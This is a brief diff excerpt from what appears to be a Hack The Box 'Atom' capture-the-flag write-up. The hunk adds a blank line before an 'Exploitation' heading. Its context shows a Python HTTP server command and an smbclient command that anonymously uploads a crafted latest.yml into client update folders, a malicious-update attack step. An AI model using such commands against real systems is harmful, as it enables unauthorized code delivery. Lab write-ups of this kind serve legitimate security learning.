@@ -251,6 +251,7 @@ python3 -m http.server 80
 ```bash
  smbclient -N //atom.htb/Software_Updates -c 'put latest.yml client1/latest.yml; put latest.yml client2/latest.yml; put latest.yml client3/latest.yml'
 ```
+
 ### Exploitation
 
 Step-by-step exploitation.
